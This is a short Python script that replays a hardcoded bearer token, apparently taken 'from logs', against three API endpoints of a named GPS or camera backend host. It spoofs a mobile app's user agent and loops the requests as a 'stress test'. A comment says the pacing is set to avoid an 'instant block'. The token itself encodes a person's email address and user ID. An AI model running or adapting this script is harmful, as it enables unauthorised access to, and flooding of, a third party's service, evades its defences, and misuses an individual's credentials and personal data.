import requests
import time

# Targeted backend infrastructure from logs
BASE_URL = "http://ipc.gps555.net"
AUTH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InNpbHZpYS5ob3JnYUBjbm12LnJvIiwiZXhwIjoxNzY5NzMwNzc3LCJmYW1pbHlfaWQiOjAsImxhbmciOiJlbiIsIm9yaWdfaWF0IjoxNzY4NDM0Nzc3LCJyb2xlX2lkIjoyLCJ1c2VyX2lkIjo4MzQ4NTMsInVzZXJuYW1lIjoic2lsdmlhLmhvcmdhQGNubXYucm8ifQ.V6lYDCH_fJIybEhOdLAlXEoi-7mXvBXHxXr12X0fqt4"

endpoints = [
    "/api/v1/lang/en",
    "/api/v1/ipc/?terminalFamilyId=834853",
    "/api/v1/ipc-function"
]

headers = {
    "Authorization": AUTH_TOKEN,
    "user-agent": "Dart/3.9 (dart:io)",
    "Content-Type": "application/json"
}

def simulate_stress(iterations=100):
    print(f"Starting stress test on {BASE_URL}...")
    for i in range(iterations):
        for path in endpoints:
            try:
                response = requests.get(f"{BASE_URL}{path}", headers=headers, timeout=2)
                print(f"[{i}] {path} -> Status: {response.status_code}")
            except requests.exceptions.RequestException as e:
                print(f"Error at {path}: {e}")
        time.sleep(0.1) # Small delay to simulate high usage without instant block

simulate_stress(50)